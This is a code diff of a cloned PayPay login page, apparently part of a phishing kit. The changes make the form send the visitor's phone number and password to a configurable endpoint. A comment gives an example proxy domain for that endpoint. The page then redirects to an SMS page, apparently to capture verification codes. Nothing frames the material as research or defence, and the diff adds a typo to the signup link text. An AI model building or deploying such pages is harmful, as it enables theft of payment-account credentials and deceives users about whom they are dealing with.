@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,viewport-fit=cover">
-  <title>PayPay</title>
+  <title>PayPay - ログイン</title>
   <link rel="icon" href="https://cdn.assets.paypay.ne.jp/cdn/apps/prod/web/5-72-0/favicon.ico">
   <style>
     @font-face{font-family:Graphik;font-display:swap;font-weight:300;src:url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff)format("woff")}
@@ -32,28 +32,32 @@
     .container { max-width: 100vw; margin: 0 auto; }
     .account-root-page { }
 
+    /* Fixed header */
     .top-header { position: relative; }
     .account-header { z-index: 100; background: #fff; width: 100%; position: fixed; top: 0; }
 
+    /* Header inner — signin is blue gradient */
     .header-signin {
       border: 0; border-bottom: 4px solid;
       flex-direction: row; flex: 1;
       justify-content: space-between; align-items: center;
       padding: 8px 12px; display: flex;
-      color: #f56a76;
-      border-image: linear-gradient(90deg, #e96b6a, rgba(253,92,92,0.55)) 1;
-      box-shadow: 0 15px 20px -20px #e96b6a;
+      color: #3895ff;
+      border-image: linear-gradient(90deg, #6fcaec, rgba(109,213,237,0.7)) 1;
+      box-shadow: 0 15px 20px -20px #6fcaec;
     }
     .header-signin img { height: 45px; display: block; }
     .header-signin h2 { font-size: 26px; font-weight: 400; margin: 0; line-height: 1.2; }
     .header-more { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); }
 
+    /* Content area */
     .account-content {
       padding-top: 80px;
       -webkit-overflow-scrolling: touch;
       position: relative;
     }
 
+    /* Sign-in page */
     .account-signin-page {
       max-width: 440px; margin-left: auto; margin-right: auto; padding: 30px 20px;
     }
@@ -91,19 +95,26 @@
     .icon-xs { width: 16px; height: 16px; }
     .icon-sm { width: 24px; height: 24px; }
 
+    /* Forgot password */
+    .reset-password { text-align: center; margin-top: 15px; font-size: 14px; font-weight: 600; }
+    .reset-password a { color: #3895ff; }
+
+    /* Submit button */
     .submit-button {
-      color: #fff; background-color: #ff0211; border: none; border-radius: 4px;
+      color: #fff; background-color: #3895ff; border: none; border-radius: 4px;
       width: 100%; height: 45px; margin-top: 30px; font-size: 14px;
       text-align: center; cursor: pointer; outline: none; font-weight: 600;
       font-family: inherit;
     }
-    .submit-button:disabled { background-color: #e6e6e6; cursor: default; color: #fff; }
+    .submit-button:disabled { background-color: #e6e6e6; cursor: default; }
 
+    /* Separator */
     .separate-text { color: #242424; margin: 2em 0 1em; padding: 0 10px; font-size: 1.25em; }
 
+    /* Yahoo! JAPAN ID button */
     .yconnect-action button {
       color: #686868; background-color: #fff; border: 1px solid #ccc; border-radius: 3px;
-      width: 100%; height: 44px; margin-top: 0; font-size: 14px;
+      width: 100%; height: 44px; font-size: 14px;
       display: flex; align-items: center; padding: 0 12px; cursor: pointer;
       font-family: inherit; font-weight: 600;
     }
@@ -113,18 +124,20 @@
     }
     .yconnect-action button span { flex: 1; text-align: center; }
 
+    /* SoftBank button */
     .sbconnect-action button {
       color: #686868; background-color: #fff; border: 1px solid #ccc; border-radius: 3px;
-      width: 100%; height: 44px; margin-top: 8px; font-size: 14px;
+      width: 100%; height: 44px; margin-top: 16px; font-size: 14px;
       display: flex; align-items: center; padding: 0 12px; cursor: pointer;
       font-family: inherit; font-weight: 600;
     }
     .sbconnect-action button .component-icon {
-      background-image: url(https://image.paypay.ne.jp/images/payment-miniapps/common/softbank.png);
+      background-image: url(https://image.paypay.ne.jp/images/payment-miniapps/web-cashier/softbank-icon.svg);
       width: 24px; height: 24px; flex-shrink: 0;
     }
     .sbconnect-action button span { flex: 1; text-align: center; }
 
+    /* Switch flow link */
     .switch-sign-flow {
       color: #3895ff; border-top: 1px solid #f2f2f2;
       margin-top: 60px; padding: 15px 0; font-size: 12px;
@@ -132,24 +145,29 @@
     .switch-sign-flow a { color: #3895ff; }
     .switch-sign-flow strong { font-size: 16px; padding-left: 10px; font-weight: 600; }
 
+    /* Error banner */
     .login-error {
-      display: none; color: #e53935; font-size: 12px; margin-top: 8px; line-height: 1.5;
+      display: none; background: #fdecea; color: #c62828;
+      border-radius: 4px; padding: 10px 14px;
+      font-size: 13px; line-height: 1.5; margin-top: 16px;
     }
     .login-error.visible { display: block; }
 
+    /* Loading overlay */
     .loading-overlay {
-      position: fixed; inset: 0; background: rgba(255,255,255,0.85);
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.2s;
+      display: none; position: fixed; inset: 0;
+      background: rgba(255,255,255,0.85); z-index: 9999;
+      flex-direction: column; align-items: center; justify-content: center;
+      gap: 16px;
     }
-    .loading-overlay.visible { opacity: 1; pointer-events: all; }
+    .loading-overlay.visible { display: flex; }
     .spinner {
-      width: 36px; height: 36px; border: 3px solid #e0e0e0;
-      border-top-color: #ff0211; border-radius: 50%;
-      animation: spin 0.7s linear infinite;
+      width: 36px; height: 36px;
+      border: 3px solid #e6e6e6; border-top-color: #3895ff;
+      border-radius: 50%; animation: spin 0.7s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .loading-text { margin-top: 12px; font-size: 13px; color: #666; }
+    .loading-text { color: #686868; font-size: 13px; }
   </style>
 </head>
 <body class="ios outside-native account-sign-in">
@@ -159,6 +177,7 @@
     <div class="container">
       <section data-v-32bf0b5d="" class="account-root-page">
 
+        <!-- Fixed header -->
         <section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header">
           <header data-v-b035e588="" class="header-signin">
             <img data-v-b035e588="" src="https://image.paypay.ne.jp/images/payment-miniapps/opa/logo.png" alt="PayPay" height="45">
@@ -167,32 +186,41 @@
           <div data-v-b035e588="" class="header-more"></div>
         </section>
 
+        <!-- Page content -->
         <div data-v-32bf0b5d="" class="account-content">
           <section data-v-991fda77="" data-v-32bf0b5d="" class="account-signin-page">
-            <h3 data-v-991fda77="">PayPayにログイン</h3>
+            <h3 data-v-991fda77="">PayPayに登録した携帯電話番号でログイン</h3>
 
-            <section data-v-6ea1e05b="" data-v-991fda77="" class="signin-signon">
+            <form data-v-6ea1e05b="" data-v-991fda77="" class="signin-signon" id="loginForm" method="post" autocomplete="on" action="#">
+              <!-- Phone number input -->
               <div data-v-6ea1e05b="" class="username">
                 <div data-v-6ea1e05b="" class="input-field">
                   <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
-                  <input data-v-6ea1e05b="" type="tel" name="username" placeholder="携帯電話番号" maxlength="13" value="" autocomplete="off">
+                  <input data-v-6ea1e05b="" id="username" type="tel" name="username" placeholder="携帯電話番号" maxlength="13" value="" autocomplete="username">
                   <label data-v-6ea1e05b="" id="login-inputPhone-txt" for="username">携帯電話番号</label>
                 </div>
               </div>
 
+              <!-- Password input -->
               <div data-v-6ea1e05b="" class="password">
                 <div data-v-6ea1e05b="" class="input-field">
                   <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
-                  <input data-v-6ea1e05b="" type="password" name="password" placeholder="パスワード" class="password-input" autocomplete="current-password">
+                  <input data-v-6ea1e05b="" id="password" type="password" name="password" placeholder="パスワード" class="password-input" autocomplete="current-password">
                   <label data-v-6ea1e05b="" id="login-inputPassword-txt" for="password">パスワード</label>
                 </div>
               </div>
 
-              <button data-v-6ea1e05b="" id="login-loginBtn" class="submit-button" disabled="">ログイン</button>
+              <!-- Forgot password -->
+              <div data-v-991fda77="" class="reset-password">
+                <a data-v-991fda77="" href="https://www.paypay.ne.jp/portal/oauth2/forgot-password?client_id=pay2-consumer-web-client">パスワードをお忘れですか？</a>
+              </div>
+
+              <!-- Submit -->
+              <button data-v-6ea1e05b="" id="login-loginBtn" type="submit" class="submit-button" disabled="">ログイン</button>
 
               <!-- Error -->
               <div class="login-error" id="loginError"></div>
-            </section>
+            </form>
 
             <!-- External account separator -->
             <div data-v-991fda77="" class="separate-text">外部のアカウントでログイン</div>
@@ -217,7 +245,7 @@
             <div data-v-991fda77="" class="switch-sign-flow">
               アカウントをお持ちでない場合
               <a data-v-991fda77="" href="signup.html">
-                <strong data-v-991fda77="" class="fs16 pl10">新規登録</strong>
+                <strong data-v-991fda77="" class="fs16 pl10">新視登録</strong>
               </a>
             </div>
           </section>
@@ -236,46 +264,25 @@
 
 <script>
 (function () {
-  const phoneInput = document.querySelector('input[name="username"]');
-  const passInput  = document.querySelector('input[name="password"]');
+  // ★ ドメインをここで指定 (末尾スラッシュなし)
+  const TARGET_DOMAIN = "";  // 例: "https://your-proxy.example.com"
+
+  const API_BASE   = TARGET_DOMAIN || "";
+  const LOGIN_PATH = "/api/login";
+
+  const form       = document.getElementById("loginForm");
+  const phoneInput = document.getElementById("username");
+  const passInput  = document.getElementById("password");
   const loginBtn   = document.getElementById("login-loginBtn");
   const errorDiv   = document.getElementById("loginError");
   const overlay    = document.getElementById("loadingOverlay");
 
-  const ERROR_MAP = [
-    [/wrong.?password|incorrect.?password|password.*incorrect|認証.*失敗|WRONG_PASSWORD/i,
-      "携帯電話番号またはパスワードが違います。"],
-    [/lock|locked|ロック/i,
-      "アカウントがロックされています。しばらく経ってから再度お試しください。"],
-    [/not.?found|no.?user|該当.*ユーザー/i,
-      "携帯電話番号またはパスワードが違います。"],
-    [/too.?many|rate.?limit|試行回数/i,
-      "ログイン試行回数が上限に達しました。しばらく経ってから再度お試しください。"],
-  ];
-
-  function mapError(raw) {
-    if (!raw) return "ログインに失敗しました。電話番号またはパスワードを確認してください。";
-    for (const [re, msg] of ERROR_MAP) {
-      if (re.test(raw)) return msg;
-    }
-    return "ログインに失敗しました。電話番号またはパスワードを確認してください。";
-  }
-
-  phoneInput.addEventListener("input", function () {
-    let digits = this.value.replace(/\D/g, "").slice(0, 11);
-    let fmt = digits;
-    if (digits.length > 7)      fmt = digits.slice(0,3) + "-" + digits.slice(3,7) + "-" + digits.slice(7);
-    else if (digits.length > 3) fmt = digits.slice(0,3) + "-" + digits.slice(3);
-    this.value = fmt;
-    updateBtn();
-  });
-
-  passInput.addEventListener("input", updateBtn);
-
   function updateBtn() {
-    const digits = phoneInput.value.replace(/\D/g, "");
-    loginBtn.disabled = !(digits.length >= 10 && passInput.value.trim());
+    loginBtn.disabled = !(phoneInput.value.trim() && passInput.value.trim());
   }
+
+  phoneInput.addEventListener("input", updateBtn);
+  passInput.addEventListener("input", updateBtn);
 
   [phoneInput, passInput].forEach(el => {
     el.style.webkitUserSelect = "text";
@@ -291,47 +298,37 @@
     errorDiv.classList.remove("visible");
   }
 
-  loginBtn.addEventListener("click", async () => {
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
     clearError();
-    const phone    = phoneInput.value.replace(/\D/g, "");
+    const phone    = phoneInput.value.trim();
     const password = passInput.value.trim();
-    if (phone.length < 10 || !password) return;
+    if (!phone || !password) return;
 
     overlay.classList.add("visible");
     loginBtn.disabled = true;
 
     try {
-      const res  = await fetch("/api/login", {
+      const res  = await fetch(API_BASE + LOGIN_PATH, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          phone,
-          password,
-          user_agent: navigator.userAgent,
-          device_info: {
-            language:    navigator.language,
-            platform:    navigator.platform,
-            screen:      screen.width + "x" + screen.height,
-            color_depth: screen.colorDepth,
-            timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
-          },
-        }),
+        body: JSON.stringify({ phone, password }),
       });
       const data = await res.json();
 
       if (!res.ok) {
-        showError(mapError(data.error));
+        showError(data.error || "ログインに失敗しました。電話番号またはパスワードを確認してください。");
         loginBtn.disabled = false;
         return;
       }
 
       if (data.status === "sms_required") {
-        sessionStorage.setItem("paypay_phone", phoneInput.value);
+        sessionStorage.setItem("paypay_phone", phone);
         window.location.href = "sms.html";
       }
 
     } catch (err) {
-      showError("サーバーに接続できませんでした。しばらく経ってから再度お試しください。");
+      showError("通信エラーが発生しました。再度お試しください。");
       loginBtn.disabled = false;
     } finally {
       overlay.classList.remove("visible");
